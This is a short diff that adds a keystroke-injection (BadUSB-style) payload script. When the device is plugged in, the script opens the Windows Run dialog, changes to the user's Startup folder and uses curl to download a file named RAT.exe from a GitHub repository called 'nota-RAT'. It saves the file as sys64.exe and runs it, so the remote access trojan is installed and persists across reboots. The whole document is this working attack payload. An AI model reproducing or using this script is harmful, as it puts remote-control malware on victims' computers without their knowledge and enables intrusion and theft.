@@ -1,0 +1,9 @@
+LOCATE US
+LED 255 0 0
+WINDOWS d
+DELAY 300
+WINDOWS r
+DELAY 300
+STRING cmd /C"cd C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup && cURL https://raw.githubusercontent.com/fluffydolphin/nota-RAT/main/RAT/RAT.exe -o sys64.exe && start sys64.exe"
+ENTER
+LED 0 255 0
